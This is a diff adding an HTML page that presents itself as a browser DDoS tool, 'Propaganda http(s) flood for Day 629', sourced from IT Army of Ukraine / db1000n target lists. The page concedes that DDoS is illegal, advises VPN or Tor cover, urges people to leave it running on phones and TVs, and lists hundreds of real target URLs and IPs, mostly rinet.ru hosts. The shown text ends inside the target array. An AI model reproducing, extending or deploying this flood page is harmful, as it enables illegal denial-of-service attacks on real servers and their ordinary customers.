@@ -1,0 +1,1721 @@
+<!doctype html><head>
+  <html lang="en">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=1024">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <title>Day 629 flood</title>
+  <link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+  <script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script type="text/javascript">
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+</script>
+</head>
+  
+  
+  
+<style>
+  /* width */
+  ::-webkit-scrollbar {
+    width: 10px;
+    overflow: auto;
+    height: 0em;
+  }
+  /* Track */
+  ::-webkit-scrollbar-track {
+    background: #34a8eb;
+  }
+  /* Handle */
+  ::-webkit-scrollbar-thumb {
+    background: #63c6ff
+    ;
+  }
+  /* Handle on hover */
+  ::-webkit-scrollbar-thumb:hover {
+    background: yellow;
+  }
+  .style10 {
+    font-size: 9px;
+    color: #FFFFFF;
+  }
+  </style>
+    <script> 
+      /* This method uses ipify's api to get the clients IP Address. 
+      This method is completely free and no limitations of use. */ 
+      $.getJSON("https://api.ipify.org?format=json", 
+                      function(data) { 
+        // userip element is where the IP will be displayed
+        $("#userip").html(data.ip); 
+      }) 
+    </script>
+    <style> 
+      h6 {
+      color:white;
+      }
+    </style>
+      <style>
+          body {
+              padding: 0;
+              margin: 0;
+              font-family: Arial, sans-serif;
+              background-color: #FFD600;
+          }
+          .title {
+              margin: 3rem auto 3rem auto;
+              text-align: center;
+              color: #005BBC;
+          }
+          .intro .howto {
+              background-color: #005BBC;
+          }
+          .intro .howto h3 {
+              color: #FFD600;
+              text-align: center;
+              margin-top: 1rem;
+          }
+          .intro .howto p {
+              color: white;
+              text-align: justify;
+          }
+  
+          .footer {
+      color: #005BBC;
+      margin-top: 2rem;
+      text-align: center;
+          }
+          .desc{
+              color:black;
+              padding-top: 2rem;
+              padding-bottom: 2rem;
+              margin: 0 auto;
+              width: 60%;
+          }
+          .desc h3 {
+              text-align: center;
+              color: #005BBC;
+          }
+          #stats h4 {
+              font-size: 1.1em;
+              text-decoration: underline;
+              color: #005BBC;
+              font-weight: 400;
+          }
+          table.status {
+              margin-bottom: 10px;
+          }
+      .style1 {
+    color: #CC0000;
+    font-weight: bold;
+  }
+  .style6 {color: #FF6262}
+      .style7 {font-size: 0.1px}
+      .style9 {
+    color: #FFD600;
+    font-weight: bold;
+    font-size: 18px;
+  }
+      .style10 {font-size: 24px}
+      .style11 {
+    font-size: 16px;
+    color: #FFFFFF;
+  } 
+      .style13 {
+    margin: 3rem auto 3rem auto;
+    text-align: center;
+    color: #FFD600;
+    font-size: 24px;
+    font-weight: bold;
+  }
+      .style14 {color: #FFFFFF}
+      .style15 {color: #FFFF00}
+      .style16 {color: #FF3300}
+      .style17 {color: #FF6633}
+      .style17 {color: #FF6633}
+  .style21 {color: #B9DCFF}
+      .style22 {color: #ECE3AA}
+    table {
+    border-color: #fffd9c;
+  }
+  </style>
+  <body onLoad="MM_preloadImages('https://i.imgur.com/3E2WIia.png')">
+      <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+      <div class="modal-dialog modal-dialog-centered" role="document">
+      <div class="modal-content">
+      <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+      <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+    <span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/kpcdmzu.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 629</span></b><span class="style16">]</i></span></span></h5></div>
+      <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+      <p style=" margin-bottom: 0px;">As you’ll already be aware, DDoSin or participating in any kind of cyber-attack in general is illegal, and usually for good reason.</p>
+  <hr style=" margin-top: 3px; margin-bottom: 3px;">
+      <p style=" margin-bottom: 0px;">Click "Continue" if you have a VPN, Proxy, the Tor browser or your own secure connection &amp; wish to support Ukraine in taking down Russian propaganda and services aiding Putins invasion</p>
+  <hr style=" margin-top: 3px; margin-bottom: 3px;">
+      This works by sending GET requests to each targeted website. It’s like opening each website in a random sequence on your PC and re-requesting the data over and over, although the data is not saved or cached, Due to the way it work, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its always best to stay safe when it comes to security.                                                                                                                                                                                                                                                           
+  <hr style=" margin-top: 3px; margin-bottom: 3px;">
+      
+     <p style="
+    margin-bottom: 0px;
+"><span style="font-size:14px;"><u></u><strong>Todays message from the IT Army of Ukraine: </strong></span><br>
+		<table width="100%" border="0">
+		  <tbody>
+		    <tr>
+		      <td width="4%">&nbsp;</td>
+		      <td width="96%">
+A <a href="https://securityaffairs.com/153958/hacking/sysaid-zero-day-clop-ransomware-gang.html" target="_blank">critical "zero-day" vulnerability in SysAid</a> identified as <br>CVE-2023-47246 was exploited by cybercriminals linked to the CLOP ransomware. This security gap allowed the execution of arbitrary code. Microsoft detected the issue, and SysAid has already released a fix. Users affected are advised to immediately update to version 23.3.36 and follow SysAid's instructions to protect their systems.<br>
+<a href="https://t.me/+z1f0BCUDMEo4ZDcy" target="_blank">Stay alert! Share problems and experiences with preventing cyber threats in our chat.</a></td>
+	        </tr>
+	      </tbody>
+	    </table>
+	</a><span style="font-size:14px;"><u></u><strong>Additional message for newly added targets:&nbsp;&nbsp;<br></strong>
+    &nbsp; &nbsp; &nbsp; To keep up with targets we're going to use the db1000n targets<br>
+    &nbsp; &nbsp; &nbsp; direct from their GitHub repository.<br>
+    &nbsp; &nbsp; &nbsp; These updates will be daily, so if the db1000n changes, it will<br>
+    &nbsp; &nbsp; &nbsp; probably take a few hours longer for the change to make it here.
+      </div>
+      <div class="modal-footer">
+      <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+      <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div><table width="100%" border="0" align="center" bgcolor="#005BBC">
+        <tr>
+          <td bgcolor="#004A9D"><div align="center">
+            <table width="200" border="1" style="border-top-width: 0px;">
+                <tbody><tr>
+                  <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                    <tbody>
+                      <tr>
+                        <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                        <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                        <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                      </tr>
+                    </tbody>
+                  </table></td>
+                </tr>
+              </tbody></table>
+            <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 629 </span>using targets from the IT Army of Ukraine.</p>
+          </div></td>
+        </tr><tr>
+          <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+            <h3><u>Information about this tool.</u></h3>
+          </div></td>
+        </tr><tr>
+          <td><table width="90%" border="0" align="center">
+            <tr>
+              <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day629.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+                <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                  <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                  Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+            <details>
+          <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+                <p><table width="100%" border="0">
+                  <tbody><tr>   
+                    <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                      <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> <em>Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</em></p>
+                      <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                      <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                      <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                        <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                      </tr>
+                  </tbody>
+              </table></p>
+            </details>
+              <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+            </tr>
+          </table>
+            <table width="613" border="0" align="center">
+              <tr>
+                <td width="608" height="155"><h3 align="center" class="style14">Session Status</h3>
+                  <p align="center" class="style14" style="margin-bottom: 0px;padding-bottom: 0px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                    It’s normal for this number to count up slow or fast and can often change.<br>
+                    If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                    If all requests are the same as all errors on some sites, it most likely means that the<br>
+                    site operator has banned the IP you’re using.<br>
+                  </p></td>
+              </tr>
+            </table>
+        </td>
+        </tr>
+      </table>
+  <div class="desc text-center" style=" padding-top: 4px;">
+    <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+    <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+  <button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+  <div id="stats" class="container">
+    <div class="row">
+    </div>
+  </div>
+  <p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+        For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+        It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+        With your help you can convince a Russian to rebel agents the war by making them<br>
+        look elsewhere for news, remember, Nothing you do is too little!<br>
+        Glory to Ukraine, Glory to the hero’s.<br><br>
+      <center>
+        <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#003697"><em><u>Estimate</u>:</em></span></strong> data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.03">0</span>MB (MegaBytes)</span></div></center>
+  <style>#betabox {
+    padding: 1px ;
+    border-top: 1px solid #3498db;
+    border-right: 1px solid #3498db;
+    background-color: #FFE248;
+    line-height: 110%;
+    border-left: 1px solid #3498db;
+    align-content: center;
+    align-self: 4px ;
+    width: 570px ;
+  }</style>
+  <script>
+          // target list
+          var urls = [
+          //Targets from DB1000n Github Update
+		    'http://195.54.214.35',
+		    'http://195.91.158.162',
+		    'http://volcano.rinet.ru',
+		    'http://sender.rinet.ru',
+		    'http://woozle.rinet.ru',
+		    'http://86.62.74.34',
+		    'http://195.91.129.164',
+		    'http://80.90.254.82',
+		    'http://86.62.99.189',
+		    'http://195.91.129.101',
+		    'http://195.91.138.247',
+		    'http://195.91.129.3',
+		    'http://86.62.79.210',
+		    'http://195.91.185.94',
+		    'http://ant.rinet.ru',
+		    'http://195.54.192.169',
+		    'http://86.62.82.114',
+		    'http://86.62.103.26',
+		    'http://86.62.99.136',
+		    'http://195.54.192.140',
+		    'http://195.91.181.177',
+		    'http://86.62.89.78',
+		    'http://kasia.rinet.ru',
+		    'http://195.54.213.209',
+		    'http://195.91.141.177',
+		    'http://195.91.180.201',
+		    'http://80.90.241.33',
+		    'http://195.91.134.60',
+		    'http://195.54.201.50',
+		    'http://stage.pilling.rinet.ru',
+		    'http://195.91.155.202',
+		    'http://195.91.151.112',
+		    'http://195.91.138.15',
+		    'http://86.62.123.204',
+		    'http://195.91.135.163',
+		    'http://195.91.196.210',
+		    'http://195.91.218.140',
+		    'http://195.54.215.68',
+		    'http://195.54.209.186',
+		    'http://195.91.134.210',
+		    'http://86.62.115.203',
+		    'http://195.91.196.43',
+		    'http://86.62.88.123',
+		    'http://195.54.214.51',
+		    'http://195.91.179.20',
+		    'http://195.91.199.210',
+		    'http://195.91.145.70',
+		    'http://elephant.rinet.ru',
+		    'http://195.91.213.12',
+		    'http://bxn-1.rinet.ru',
+		    'http://195.91.138.186',
+		    'http://195.91.181.105',
+		    'http://86.62.91.69',
+		    'http://195.91.177.172',
+		    'http://195.91.187.119',
+		    'http://86.62.74.195',
+		    'http://a.rinet.ru',
+		    'http://195.91.198.196',
+		    'http://86.62.73.74',
+		    'http://195.91.223.218',
+		    'http://195.91.191.230',
+		    'http://86.62.68.194',
+		    'http://86.62.91.3',
+		    'http://falcon.rinet.ru',
+		    'http://86.62.76.195',
+		    'http://195.91.178.116',
+		    'http://195.91.187.112',
+		    'http://mole.rinet.ru',
+		    'http://195.54.213.86',
+		    'http://86.62.92.18',
+		    'http://195.91.150.36',
+		    'http://local.rinet.ru',
+		    'http://195.54.215.98',
+		    'http://195.91.222.201',
+		    'http://195.91.221.186',
+		    'http://195.54.192.182',
+		    'http://195.91.220.67',
+		    'http://195.91.191.104',
+		    'http://86.62.88.150',
+		    'http://195.54.201.234',
+		    'http://195.91.181.25',
+		    'http://195.91.179.134',
+		    'http://195.91.183.67',
+		    'http://195.54.201.172',
+		    'http://195.91.162.196',
+		    'http://ggc2.rinet.ru',
+		    'http://195.91.141.61',
+		    'http://195.91.150.38',
+		    'http://195.91.140.245',
+		    'http://195.54.214.14',
+		    'http://195.91.138.78',
+		    'http://195.91.191.40',
+		    'http://195.91.154.76',
+		    'http://mrtg.rinet.ru',
+		    'http://www.levin.rinet.ru',
+		    'http://86.62.115.99',
+		    'http://195.91.168.180',
+		    'http://86.62.79.98',
+		    'http://86.62.80.11',
+		    'http://195.91.210.164',
+		    'http://195.54.214.152',
+		    'http://195.54.215.100',
+		    'http://195.91.141.185',
+		    'http://195.91.144.26',
+		    'http://195.91.148.81',
+		    'http://195.91.185.188',
+		    'http://195.91.148.14',
+		    'http://195.54.215.110',
+		    'http://195.91.201.146',
+		    'http://86.62.81.146',
+		    'http://h89.bb.rinet.ru',
+		    'http://86.62.94.174',
+		    'http://86.62.102.3',
+		    'http://195.91.200.166',
+		    'http://195.54.215.66',
+		    'http://195.91.138.200',
+		    'http://195.91.180.92',
+		    'http://86.62.96.34',
+		    'http://195.91.218.242',
+		    'http://new.wiki.rinet.ru',
+		    'http://195.54.214.86',
+		    'http://195.91.181.68',
+		    'http://195.91.221.14',
+		    'http://195.91.143.45',
+		    'http://195.91.139.109',
+		    'http://lg.rinet.ru',
+		    'http://195.91.187.109',
+		    'http://195.91.180.219',
+		    'http://86.62.94.162',
+		    'http://195.91.191.121',
+		    'http://195.91.159.70',
+		    'http://195.91.187.133',
+		    'http://195.54.211.61',
+		    'http://195.91.177.251',
+		    'http://86.62.66.123',
+		    'http://86.62.82.211',
+		    'http://195.91.151.81',
+		    'http://195.91.141.253',
+		    'http://195.91.138.101',
+		    'http://86.62.89.123',
+		    'http://86.62.103.23',
+		    'http://195.91.141.54',
+		    'http://db.rinet.ru',
+		    'http://195.91.150.8',
+		    'http://195.91.185.149',
+		    'http://195.91.219.195',
+		    'http://195.54.192.171',
+		    'http://86.62.117.76',
+		    'http://195.91.137.77',
+		    'http://86.62.98.194',
+		    'http://195.91.191.15',
+		    'http://195.91.139.45',
+		    'http://86.62.113.19',
+		    'http://195.91.165.1',
+		    'http://195.54.210.137',
+		    'http://195.91.130.166',
+		    'http://forum.rinet.ru',
+		    'http://86.62.65.189',
+		    'http://86.62.121.11',
+		    'http://195.91.170.43',
+		    'http://86.62.73.72',
+		    'http://195.91.131.126',
+		    'http://86.62.99.187',
+		    'http://195.91.194.206',
+		    'http://music.rinet.ru',
+		    'http://195.91.195.66',
+		    'http://callreg.rinet.ru',
+		    'http://195.91.139.42',
+		    'http://86.62.67.60',
+		    'http://86.62.69.69',
+		    'http://195.91.187.194',
+		    'http://pluto.rinet.ru',
+		    'http://86.62.80.214',
+		    'http://195.91.138.120',
+		    'http://195.91.144.140',
+		    'http://86.62.70.146',
+		    'http://86.62.108.183',
+		    'http://195.91.145.139',
+		    'http://195.91.191.75',
+		    'http://195.91.141.217',
+		    'http://86.62.83.67',
+		    'http://195.91.185.196',
+		    'http://gitlab.rinet.ru',
+		    'http://195.91.205.81',
+		    'http://195.91.176.100',
+		    'http://195.91.191.133',
+		    'http://195.91.205.82',
+		    'http://195.54.207.73',
+		    'http://86.62.91.150',
+		    'http://195.91.177.194',
+		    'http://195.91.196.86',
+		    'http://195.54.215.109',
+		    'http://195.91.138.85',
+		    'http://195.54.214.69',
+		    'http://195.54.214.94',
+		    'http://86.62.92.199',
+		    'http://195.91.136.82',
+		    'http://86.62.77.90',
+		    'http://195.91.222.170',
+		    'http://195.91.145.7',
+		    'http://195.91.187.41',
+		    'http://new.rinet.ru',
+		    'http://86.62.99.138',
+		    'http://195.91.157.27',
+		    'http://86.62.96.130',
+		    'http://195.91.177.192',
+		    'http://195.54.213.64',
+		    'http://195.91.162.211',
+		    'http://195.91.187.163',
+		    'http://195.54.192.66',
+		    'http://195.91.156.58',
+		    'http://195.91.191.57',
+		    'http://connect.rinet.ru',
+		    'http://195.54.214.113',
+		    'http://195.54.205.77',
+		    'http://86.62.74.130',
+		    'http://parrot.rinet.ru',
+		    'http://195.91.181.16',
+		    'http://195.91.180.148',
+		    'http://desman.rinet.ru',
+		    'http://195.54.214.119',
+		    'http://195.91.162.195',
+		    'http://86.62.71.2',
+		    'http://courier.ner.rinet.ru',
+		    'http://195.91.187.136',
+		    'http://195.91.201.187',
+		    'http://195.91.221.118',
+		    'http://86.62.115.243',
+		    'http://195.91.154.68',
+		    'http://195.91.141.57',
+		    'http://195.91.151.10',
+		    'http://195.91.138.168',
+		    'http://195.91.134.125',
+		    'http://195.91.178.19',
+		    'http://195.91.220.194',
+		    'http://195.91.217.119',
+		    'http://86.62.118.60',
+		    'http://86.62.89.126',
+		    'http://195.91.181.94',
+		    'http://86.62.88.203',
+		    'http://195.54.209.95',
+		    'http://195.91.191.238',
+		    'http://195.91.145.90',
+		    'http://86.62.76.170',
+		    'http://86.62.85.4',
+		    'http://195.91.141.249',
+		    'http://86.62.117.194',
+		    'http://195.91.178.2',
+		    'http://195.91.180.80',
+		    'http://nms.rinet.ru',
+		    'http://86.62.102.122',
+		    'http://195.91.138.221',
+		    'http://86.62.91.149',
+		    'http://86.62.100.11',
+		    'http://195.91.174.67',
+		    'http://195.91.152.198',
+		    'http://195.91.148.21',
+		    'http://195.91.180.32',
+		    'http://195.91.189.82',
+		    'http://86.62.113.235',
+		    'http://195.54.192.174',
+		    'http://195.91.132.116',
+		    'http://195.91.185.121',
+		    'http://195.91.191.184',
+		    'http://86.62.120.181',
+		    'http://86.62.115.98',
+		    'http://dev.secure.rinet.ru',
+		    'http://86.62.120.219',
+		    'http://86.62.103.22',
+		    'http://195.91.148.232',
+		    'http://ad-marg.rinet.ru',
+		    'http://195.54.214.145',
+		    'http://86.62.82.212',
+		    'http://86.62.82.199',
+		    'http://86.62.93.211',
+		    'http://86.62.85.130',
+		    'http://195.91.137.236',
+		    'http://195.91.182.86',
+		    'http://86.62.91.136',
+		    'http://ctl.rinet.ru',
+		    'http://195.91.141.65',
+		    'http://195.91.187.65',
+		    'http://customers.rinet.ru',
+		    'http://86.62.82.217',
+		    'http://proxy.rinet.ru',
+		    'http://195.91.189.83',
+		    'http://195.91.141.1',
+		    'http://pypi.rinet.ru',
+		    'http://86.62.99.190',
+		    'http://195.91.133.11',
+		    'http://195.91.141.187',
+		    'http://86.62.67.34',
+		    'http://195.91.181.104',
+		    'http://195.91.191.132',
+		    'http://alex-spd.rinet.ru',
+		    'http://195.91.153.102',
+		    'http://195.91.154.138',
+		    'http://86.62.114.19',
+		    'http://195.91.148.142',
+		    'http://195.91.167.241',
+		    'http://lkn-0.rinet.ru',
+		    'http://195.91.199.36',
+		    'http://86.62.97.73',
+		    'http://api.rinet.ru',
+		    'http://195.54.215.107',
+		    'http://vpn.off.rinet.ru',
+		    'http://195.91.140.161',
+		    'http://86.62.89.74',
+		    'http://195.91.211.111',
+		    'http://195.91.162.198',
+		    'http://86.62.99.192',
+		    'http://195.91.183.74',
+		    'http://195.91.141.3',
+		    'http://86.62.115.82',
+		    'http://195.91.211.180',
+		    'http://195.91.128.177',
+		    'http://design.rinet.ru',
+		    'http://195.91.144.92',
+		    'http://195.91.138.16',
+		    'http://195.91.140.6',
+		    'http://195.91.151.49',
+		    'http://195.91.198.60',
+		    'http://195.91.144.103',
+		    'http://195.91.177.193',
+		    'http://195.91.144.105',
+		    'http://d187-070.cl.rinet.ru',
+		    'http://195.54.213.229',
+		    'http://195.91.144.114',
+		    'http://195.54.215.108',
+		    'http://86.62.112.227',
+		    'http://195.91.201.226',
+		    'http://195.91.160.132',
+		    'http://86.62.118.98',
+		    'http://195.91.159.11',
+		    'http://195.91.143.35',
+		    'http://86.62.99.175',
+		    'http://195.91.130.62',
+		    'http://195.91.153.173',
+		    'http://d187-090.cl.rinet.ru',
+		    'http://86.62.74.38',
+		    'http://195.54.213.42',
+		    'http://195.54.192.129',
+		    'http://195.91.178.218',
+		    'http://86.62.79.214',
+		    'http://195.91.180.45',
+		    'http://195.91.148.227',
+		    'http://195.91.191.223',
+		    'http://195.91.182.35',
+		    'http://195.91.181.135',
+		    'http://195.54.214.144',
+		    'http://195.91.185.154',
+		    'http://img.rinet.ru',
+		    'http://h195-91-221-35.ln.rinet.ru',
+		    'http://195.54.192.151',
+		    'http://195.91.180.39',
+		    'http://86.62.121.210',
+		    'http://195.91.148.58',
+		    'http://195.91.187.187',
+		    'http://195.91.187.18',
+		    'http://195.91.186.69',
+		    'http://195.91.138.232',
+		    'http://195.54.195.134',
+		    'http://195.91.211.179',
+		    'http://195.91.187.86',
+		    'http://content.rinet.ru',
+		    'http://195.91.144.99',
+		    'http://195.91.213.28',
+		    'http://195.91.162.78',
+		    'http://195.91.162.199',
+		    'http://195.54.201.27',
+		    'http://195.91.138.122',
+		    'http://shrew2.rinet.ru',
+		    'http://users.rinet.ru',
+		    'http://195.54.192.9',
+		    'http://195.54.213.94',
+		    'http://195.91.148.143',
+		    'http://info.rinet.ru',
+		    'http://195.91.153.178',
+		    'http://195.91.187.7',
+		    'http://86.62.69.43',
+		    'http://195.91.181.36',
+		    'http://195.91.213.75',
+		    'http://80.90.250.200',
+		    'http://195.91.131.196',
+		    'http://86.62.68.91',
+		    'http://195.91.223.217',
+		    'http://195.54.213.20',
+		    'http://195.91.217.54',
+		    'http://195.54.192.176',
+		    'http://195.91.191.13',
+		    'http://ntp.rinet.ru',
+		    'http://195.91.187.35',
+		    'https://195.91.138.128',
+		    'https://n.rinet.ru',
+		    'https://86.62.115.135',
+		    'https://86.62.80.130',
+		    'https://195.91.130.135',
+		    'https://195.91.163.155',
+		    'https://86.62.93.114',
+		    'https://86.62.76.228',
+		    'https://86.62.85.109',
+		    'https://195.91.154.54',
+		    'https://195.54.206.34',
+		    'https://195.91.144.194',
+		    'https://86.62.85.108',
+		    'https://195.54.211.58',
+		    'https://195.54.213.253',
+		    'https://lk.rinet.ru',
+		    'https://86.62.67.141',
+		    'https://pop.rinet.ru',
+		    'https://86.62.88.51',
+		    'https://86.62.71.135',
+		    'https://86.62.72.21',
+		    'https://195.91.179.104',
+		    'https://195.54.207.109',
+		    'https://195.91.162.3',
+		    'https://195.91.145.222',
+		    'https://proxy.rinet.ru',
+		    'https://86.62.112.226',
+		    'https://195.91.144.123',
+		    'https://86.62.88.219',
+		    'https://86.62.73.196',
+		    'https://195.54.214.116',
+		    'https://80.90.243.51',
+		    'https://86.62.98.140',
+		    'https://195.91.159.10',
+		    'https://195.54.214.55',
+		    'https://86.62.88.226',
+		    'https://195.91.151.5',
+		    'https://195.91.155.67',
+		    'https://195.91.184.35',
+		    'https://195.91.200.21',
+		    'https://195.91.171.35',
+		    'https://86.62.80.202',
+		    'https://195.91.138.219',
+		    'https://195.91.156.132',
+		    'https://195.91.144.85',
+		    'https://86.62.102.214',
+		    'https://86.62.124.73',
+		    'https://vmb3.rinet.ru',
+		    'https://195.91.144.90',
+		    'https://195.54.214.150',
+		    'https://195.54.192.13',
+		    'https://195.91.205.235',
+		    'https://195.54.214.224',
+		    'https://195.91.159.213',
+		    'https://86.62.120.155',
+		    'https://195.91.238.227',
+		    'https://195.54.206.186',
+		    'https://195.91.187.142',
+		    'https://videonab.rinet.ru',
+		    'https://195.91.138.174',
+		    'https://86.62.121.172',
+		    'https://195.91.164.26',
+		    'https://86.62.76.154',
+		    'https://195.91.155.226',
+		    'https://195.91.206.157',
+		    'https://195.91.191.243',
+		    'https://86.62.79.163',
+		    'https://195.91.205.198',
+		    'https://195.91.196.14',
+		    'https://86.62.119.218',
+		    'https://195.91.162.200',
+		    'https://195.91.209.178',
+		    'https://86.62.84.226',
+		    'https://195.91.145.226',
+		    'https://195.91.181.249',
+		    'https://86.62.70.36',
+		    'https://86.62.95.11',
+		    'https://195.91.183.37',
+		    'https://bt.rinet.ru',
+		    'https://195.54.214.172',
+		    'https://195.54.213.224',
+		    'https://195.91.133.54',
+		    'https://195.91.191.110',
+		    'https://195.91.134.230',
+		    'https://86.62.76.42',
+		    'https://86.62.119.59',
+		    'https://195.91.152.60',
+		    'https://195.91.187.178',
+		    'https://195.91.182.137',
+		    'https://195.91.139.125',
+		    'https://195.91.221.36',
+		    'https://195.91.220.56',
+		    'https://195.91.183.36',
+		    'https://195.54.209.202',
+		    'https://86.62.82.117',
+		    'https://195.91.180.199',
+		    'https://195.91.191.169',
+		    'https://86.62.112.186',
+		    'https://195.91.145.9',
+		    'https://195.91.201.188',
+		    'https://86.62.97.94',
+		    'https://86.62.88.33',
+		    'https://195.91.218.141',
+		    'https://86.62.96.132',
+		    'https://86.62.87.162',
+		    'https://ctl.rinet.ru',
+		    'https://195.91.181.148',
+		    'https://86.62.71.213',
+		    'https://195.91.210.99',
+		    'https://195.91.156.88',
+		    'https://195.91.138.124',
+		    'https://195.91.209.163',
+		    'https://195.91.219.147',
+		    'https://195.91.191.212',
+		    'https://195.91.184.34',
+		    'https://195.91.163.42',
+		    'https://86.62.81.151',
+		    'https://86.62.93.66',
+		    'https://86.62.71.216',
+		    'https://195.91.159.169',
+		    'https://195.91.213.44',
+		    'https://195.91.159.168',
+		    'https://195.91.136.248',
+		    'https://195.91.174.226',
+		    'https://195.91.182.23',
+		    'https://80.90.240.72',
+		    'https://195.91.162.162',
+		    'https://195.54.213.127',
+		    'https://86.62.81.19',
+		    'https://195.54.209.147',
+		    'https://195.91.138.215',
+		    'https://86.62.95.230',
+		    'https://86.62.70.61',
+		    'https://195.54.213.97',
+		    'https://86.62.84.51',
+		    'https://195.54.214.62',
+		    'https://86.62.120.10',
+		    'https://195.54.214.174',
+		    'https://195.91.155.99',
+		    'https://195.54.207.114',
+		    'https://195.91.183.18',
+		    'https://195.54.209.91',
+		    'https://195.54.213.196',
+		    'https://195.91.145.194',
+		    'https://195.91.208.19',
+		    'https://195.54.207.96',
+		    'https://195.91.187.177',
+		    'https://195.91.189.216',
